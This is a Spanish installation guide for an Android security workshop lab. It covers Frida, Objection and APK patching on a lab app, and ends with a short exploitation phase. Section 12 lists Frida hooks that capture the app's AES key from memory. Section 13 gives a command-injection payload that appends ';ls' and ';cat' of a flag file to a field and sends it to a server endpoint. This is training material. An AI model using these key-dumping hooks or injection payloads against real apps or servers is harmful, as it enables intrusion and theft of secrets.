# 🧰 Guía de Instalación Completa — Taller "Cordobitec" (desde cero)

Esta guía asume una máquina **Linux (Ubuntu/Debian)** limpia, sin nada instalado. Cubre dos caminos:

- **Opción A — Emulador Android** (no necesita hardware, ideal para probar la guía o para quien no tiene celular Android a mano).
- **Opción B — Celular físico NO rooteado** (como se usó en el taller real).

Todos los comandos están probados tal cual. Las versiones de Frida están **fijadas a propósito** — no son arbitrarias: están documentadas en `WRITEUP_PASO_A_PASO.md` (sección FASE 0) tras probar 6 versiones distintas contra un dispositivo real y encontrar bugs de compatibilidad con Android 15 en todas excepto una.

> 📌 Versión de referencia de este documento: probado en Ubuntu 24.04 LTS, 2026-10-01.

---

## Índice

1. [Paquetes base del sistema](#1-paquetes-base-del-sistema)
2. [Node.js (para `apk-mitm`)](#2-nodejs-para-apk-mitm)
3. [Android SDK Platform Tools (`adb`)](#3-android-sdk-platform-tools-adb)
4. [`apktool` (necesario para `objection patchapk`)](#4-apktool-necesario-para-objection-patchapk)
5. [Java JDK (necesario para `apktool`/firmado de APKs)](#5-java-jdk-necesario-para-apktoolfirmado-de-apks)
6. [Entorno Python + Frida/Objection (versiones fijadas)](#6-entorno-python--fridaobjection-versiones-fijadas)
7. [Opción A — Preparar un emulador Android](#7-opción-a--preparar-un-emulador-android)
8. [Opción B — Preparar un celular físico no rooteado](#8-opción-b--preparar-un-celular-físico-no-rooteado)
9. [Parchear el APK con Frida Gadget](#9-parchear-el-apk-con-frida-gadget)
10. [Instalar y lanzar la app (ambas opciones)](#10-instalar-y-lanzar-la-app-ambas-opciones)
11. [Conectar Frida y verificar que todo funciona](#11-conectar-frida-y-verificar-que-todo-funciona)
12. [Usar la caja de herramientas del taller](#12-usar-la-caja-de-herramientas-del-taller)
13. [Fase de explotación (RCE)](#13-fase-de-explotación-rce)
14. [Troubleshooting rápido](#14-troubleshooting-rápido)

---

## 1. Paquetes base del sistema

```bash
sudo apt update
sudo apt install -y python3 python3-venv python3-pip unzip curl wget git \
                     openjdk-21-jdk-headless aapt
```

Verificar:
```bash
python3 --version        # Python 3.12.3 (probado)
java -version             # openjdk version "21.0.12.1" (probado)
aapt version               # cualquier versión reciente de aapt sirve
```

---

## 2. Node.js (para `apk-mitm`)

`apk-mitm` quita el Network Security Config del APK para poder interceptar tráfico HTTPS con un proxy (Burp/mitmproxy). Se instala vía `npx`, no hace falta instalarlo global.

Instalar Node con `nvm` (recomendado, evita conflictos con el Node del sistema):

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
source ~/.bashrc    # o abrir una terminal nueva
nvm install 20
nvm use 20
```

Verificar:
```bash
node --version    # v20.19.5 (probado, cualquier v20 LTS sirve)
npm --version     # 10.8.2 (probado)
```

No es necesario instalar `apk-mitm` por separado: se invoca con `npx apk-mitm` y se descarga la última versión la primera vez (probado con **apk-mitm 1.3.0**).

---

## 3. Android SDK Platform Tools (`adb`)

```bash
sudo apt install -y android-sdk-platform-tools
# o, si el paquete de apt está desactualizado, bajar directo de Google:
# wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip
# unzip platform-tools-latest-linux.zip -d ~/android-sdk/
# export PATH="$HOME/android-sdk/platform-tools:$PATH"
```

Verificar:
```bash
adb --version
# Android Debug Bridge version 1.0.41
# Version 34.0.4-debian   (probado)
```

---

## 4. `apktool` (necesario para `objection patchapk`)

`objection` usa `apktool` para desempaquetar y re-empaquetar el APK al inyectar el Frida Gadget.

```bash
sudo apt install -y apktool
```

Si la versión de `apt` es muy vieja, instalar manual:
```bash
sudo curl -sSL -o /usr/local/bin/apktool \
  https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
sudo curl -sSL -o /usr/local/bin/apktool.jar \
  https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
sudo chmod +x /usr/local/bin/apktool /usr/local/bin/apktool.jar
```

Verificar:
```bash
apktool --version    # 3.0.2 (probado; cualquier 2.9.x o 3.x sirve)
```

---

## 5. Java JDK (necesario para `apktool`/firmado de APKs)

Ya instalado en el paso 1 (`openjdk-21-jdk-headless`). Si falta:
```bash
sudo apt install -y openjdk-21-jdk-headless
java -version
```

---

## 6. Entorno Python + Frida/Objection (versiones fijadas)

**⚠️ Paso crítico.** No usar `pip install frida frida-tools objection` sin versión — la última versión de Frida (17.19.0 al momento de escribir esto) **crashea** en dispositivos Android 15/16 reales. Usar exactamente estas versiones:

```bash
cd /ruta/al/proyecto/Workshop_Solution
python3 -m venv env
source env/bin/activate

pip install --upgrade pip
pip install "frida==17.6.0" "frida-tools==14.5.2" "objection==1.12.5"
```

O directamente, si ya existe `requirements.txt` en el proyecto:
```bash
pip install -r requirements.txt
```

Verificar:
```bash
frida --version        # 17.6.0
objection version       # 1.12.5
pip list | grep -i frida
# frida              17.6.0
# frida-tools        14.5.2
```

> Siempre que trabajes en este proyecto, activá el venv primero: `source env/bin/activate`

---

## 7. Opción A — Preparar un emulador Android

Si no tenés Android Studio instalado:

```bash
# 1. Bajar los "command line tools" de Android
mkdir -p ~/android-sdk/cmdline-tools
cd ~/android-sdk/cmdline-tools
wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
unzip commandlinetools-linux-11076708_latest.zip
mv cmdline-tools latest

export ANDROID_HOME=~/android-sdk
export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$PATH"

# 2. Instalar plataforma, build-tools, emulador y una imagen de sistema
#    IMPORTANTE: usar una imagen API 30-33 (Android 11-13). Evitar API 34+ (Android 14+)
#    por el bug de compatibilidad con ART documentado en WRITEUP_PASO_A_PASO.md.
sdkmanager --licenses
sdkmanager "platform-tools" "emulator" \
           "platforms;android-33" \
           "system-images;android-33;google_apis;x86_64"

# 3. Crear el AVD
avdmanager create avd -n cordobitec_lab \
  -k "system-images;android-33;google_apis;x86_64" \
  -d "pixel_6"

# 4. Levantarlo
emulator -avd cordobitec_lab -no-snapshot-load
```

Esperar a que bootee completamente (pantalla de inicio de Android) y verificar:
```bash
adb devices -l
# emulator-5554   device   product:sdk_gphone64_x86_64 ...
```

> **Nota de arquitectura:** una imagen `x86_64` necesita el gadget de Frida compilado para `x86_64`, no para `arm64-v8a`. `objection patchapk` detecta la arquitectura del dispositivo conectado automáticamente — no hay que hacer nada especial, solo asegurarse de tener **un solo dispositivo conectado** (apagar el físico o el otro emulador) al correr `objection patchapk`.

---

## 8. Opción B — Preparar un celular físico no rooteado

1. En el celular: **Ajustes → Acerca del teléfono → tocar 7 veces "Número de compilación"** para activar Opciones de Desarrollador.
2. **Ajustes → Opciones de desarrollador → activar "Depuración USB"**.
3. Conectar el cable USB a la PC (usar el cable original del teléfono, no uno "solo carga" — ver sección de Troubleshooting).
4. En el teléfono va a aparecer un diálogo "¿Permitir depuración USB desde esta computadora?" → **Aceptar** y tildar **"Confiar siempre en esta computadora"**.
5. Verificar en la PC:
   ```bash
   adb devices -l
   # <serial>   device   usb:1-1 product:... model:... device:...
   ```
   Si dice `unauthorized`, revisar el diálogo en el teléfono. Si dice `offline` o se desconecta solo, ver [Troubleshooting](#14-troubleshooting-rápido).
6. Anotar la arquitectura del celular (normalmente `arm64-v8a` en cualquier teléfono de los últimos ~8 años):
   ```bash
   adb shell getprop ro.product.cpu.abi
   # arm64-v8a
   ```

---

## 9. Parchear el APK con Frida Gadget

Con el emulador o el celular ya conectado (`adb devices -l` debe mostrar **exactamente un** dispositivo en estado `device`):

```bash
cd /ruta/al/proyecto/Workshop_Solution
source env/bin/activate
```

**9.1. (Opcional pero recomendado) Quitar el Network Security Config para poder proxear tráfico:**
```bash
npx apk-mitm cordobitec.apk
# Salida: cordobitec-patched.apk
```

**9.2. Limpiar la caché de gadgets de objection.** Esto es crítico: `objection` guarda el `.so` del gadget descargado en `~/.objection/` y, si ya lo usaste antes con otra versión de Frida, **no lo vuelve a descargar solo** — queda una versión vieja pegada y todo falla más adelante sin ningún mensaje de error claro.
```bash
rm -f ~/.objection/android/arm64-v8a/libfrida-gadget.so \
      ~/.objection/android/x86_64/libfrida-gadget.so \
      ~/.objection/gadget_versions
```

**9.3. Inyectar el Frida Gadget, pidiendo explícitamente la versión que sabemos que funciona:**

```bash
# Celular físico (arm64-v8a):
objection patchapk --source cordobitec-patched.apk \
  --gadget-version 17.6.0 --architecture arm64-v8a

# Emulador x86_64:
objection patchapk --source cordobitec-patched.apk \
  --gadget-version 17.6.0 --architecture x86_64
```
(Si no corriste el paso 9.1, usá `--source cordobitec.apk` en su lugar.)

Salida esperada: `cordobitec-patched.objection.apk` (o `cordobitec.objection.apk` si no se usó apk-mitm) en el directorio actual.

> `objection` también acepta que no le digas `--architecture` y lo detecta solo via `adb` — pero si hay más de un dispositivo conectado (ej. emulador + celular a la vez) va a fallar o elegir uno al azar. Especificarlo siempre a mano evita sorpresas.

---

## 10. Instalar y lanzar la app (ambas opciones)

```bash
# Averiguar el nombre del paquete y la activity principal (una sola vez)
aapt dump badging cordobitec-patched.objection.apk | grep -E "package:|launchable-activity"
# package: name='com.securechat' ...
# launchable-activity: name='com.securechat.MainActivity' ...

# Desinstalar cualquier versión previa e instalar la nueva
adb uninstall com.securechat
adb install -r cordobitec-patched.objection.apk

# Lanzarla
adb shell am start -n com.securechat/.MainActivity
```

La app va a quedar con **pantalla en negro**, esperando a que un cliente Frida se conecte al Gadget — esto es esperado.

---

## 11. Conectar Frida y verificar que todo funciona

```bash
# Redirigir los puertos del Gadget desde el dispositivo a la PC
adb forward tcp:27042 tcp:27042
adb forward tcp:27043 tcp:27043

# Verificar que Frida puede ver el proceso del Gadget
frida-ps -H 127.0.0.1:27042
#   PID  Name
# -----  ------
# 12345  Gadget
```

Si en vez de eso aparece un error, ver la sección de [Troubleshooting](#14-troubleshooting-rápido) — **no sigas** con los pasos siguientes hasta que `frida-ps` liste `Gadget` correctamente.

Prueba definitiva — enumerar las clases de la app (debe listar `CryptoModule` entre otras):
```bash
python3 frida_workshop_tool.py enum_classes --package com.securechat
```
Salida esperada:
```
[Clase] com.securechat.MainActivity
[Clase] com.securechat.PinnedOkHttpClientFactory
[Clase] com.securechat.CryptoModule
[Clase] com.securechat.BuildConfig
[Clase] com.securechat.MainApplication$1
[Clase] com.securechat.MainApplication
[Clase] com.securechat.CryptoPackage
[*] Búsqueda finalizada. 7 clases encontradas.
```

Si ves esto, el entorno está 100% funcional y podés seguir con el taller normalmente.

---

## 12. Usar la caja de herramientas del taller

Con la app corriendo y los puertos redirigidos (pasos 10 y 11):

```bash
# Ver métodos de una clase
python3 frida_workshop_tool.py enum_methods --class-name com.securechat.CryptoModule

# Hookear un método para ver sus argumentos/retorno en vivo
python3 frida_workshop_tool.py hook_method --class-name com.securechat.CryptoModule --method encryptPayload

# Robar la clave AES (reiniciar la app antes para capturar el momento exacto de generación)
adb shell am force-stop com.securechat
adb shell am start -n com.securechat/.MainActivity
sleep 3
frida -H 127.0.0.1:27042 -n Gadget -l 3_hook_key.js
# ... usar la app normalmente hasta ver "[🔑 CLAVE AES CAPTURADA]" en la consola

# Alternativas si no llegaste a tiempo con el script anterior:
frida -H 127.0.0.1:27042 -n Gadget -l 4_dump_keys_gen.js     # hook universal de SecretKeySpec
frida -H 127.0.0.1:27042 -n Gadget -l 5_dump_ram.js          # escaneo de heap en vivo
frida -H 127.0.0.1:27042 -n Gadget -l 6_dump_all_strings.js  # fuerza bruta: dump de todos los strings en RAM
```

---

## 13. Fase de explotación (RCE)

Con la clave AES ya capturada (ej. `CordobitecBackendSecretKey123456`):

```bash
python3 encrypt_payload.py
# Ingresar la clave AES
# Body: {"target": "127.0.0.1; ls -la /home/node/"}
# Copiar el Base64 que devuelve

curl -X POST http://<IP_DEL_VPS>:5050/api/v1/network/health \
     -H "Content-Type: application/json" \
     -d '{"data": "PEGAR_BASE64_AQUI"}'

# Repetir cambiando el target a: 127.0.0.1; cat /home/node/.flag.txt
```

Ver `WRITEUP_PASO_A_PASO.md` para el detalle completo de esta fase.

---

## 14. Troubleshooting rápido

| Síntoma | Causa | Solución |
|---|---|---|
| `frida-ps` da `unable to communicate with remote frida-server; please ensure major versions match` | Cliente y gadget en versiones distintas | Repetir paso 9.2 (limpiar caché) y 9.3 pisando `--gadget-version` con la misma versión que `frida --version` en el venv |
| La app crashea (SIGSEGV) al abrirla o al correr cualquier script Frida | Versión de Frida con bug conocido en Android 15/16 (afecta 16.7.x, 17.0.x, 17.19.x — ver tabla en `WRITEUP_PASO_A_PASO.md`) | Usar exactamente `frida==17.6.0` / gadget `17.6.0` como en esta guía |
| Error `Unable to find copied methods in java/lang/Thread; please file a bug` al hacer `Java.perform` | Google Play System Update rompió el módulo ART, incompatible con ciertas versiones de `frida-java-bridge` ([frida/frida#3666](https://github.com/frida/frida/issues/3666)) | Igual que el anterior: `frida==17.6.0` es la versión que evita este bug en este dispositivo |
| `adb devices` muestra `unauthorized` | No se aceptó el diálogo de depuración USB en el teléfono, o se cayó la conexión antes de que se guardara la autorización | Revisar el teléfono, aceptar y tildar "Confiar siempre"; si sigue, ver la fila siguiente |
| El dispositivo se desconecta solo, alterna `device`/`unauthorized`/`closed`, el `transport_id` cambia constantemente en `adb devices -l` | Problema físico de cable/puerto/alimentación USB | Probar otro cable (no uno "solo carga"), otro puerto (evitar hubs), y confirmar que `adb devices -l` da el mismo `transport_id` dos veces seguidas antes de instalar nada |
| `objection patchapk` dice `Failed to determine architecture. Is the device connected and authorized?` | Se cortó la conexión USB justo en ese instante, o hay más de un dispositivo conectado | Reintentar el comando con `adb devices -l` estable; o pasar `--architecture arm64-v8a` / `--architecture x86_64` explícito |
| La app queda en pantalla negra para siempre | Es el comportamiento esperado: el Gadget espera a que un cliente Frida se conecte (`frida -H ... -n Gadget -l script.js`) | Normal — no es un error, seguir con el paso 11 |
| `pip install` tira `ResolutionImpossible` con `frida` y `frida-tools` | Se pidió una versión de `frida` incompatible con la de `frida-tools` ya instalada (sus rangos de versión no siempre calzan) | Instalar ambos en el mismo comando con versiones exactas probadas (paso 6), o dejar `frida-tools` sin versión para que `pip` resuelva una compatible automáticamente |

---

**Resumen de versiones usadas en esta guía (fijadas y probadas):**

| Herramienta | Versión |
|---|---|
| Python | 3.12.3 |
| Node.js | 20.19.5 |
| `apk-mitm` | 1.3.0 |
| `apktool` | 3.0.2 |
| OpenJDK | 21.0.12.1 |
| `adb` (platform-tools) | 34.0.4 |
| `frida` | **17.6.0** |
| `frida-tools` | **14.5.2** |
| `objection` | **1.12.5** |
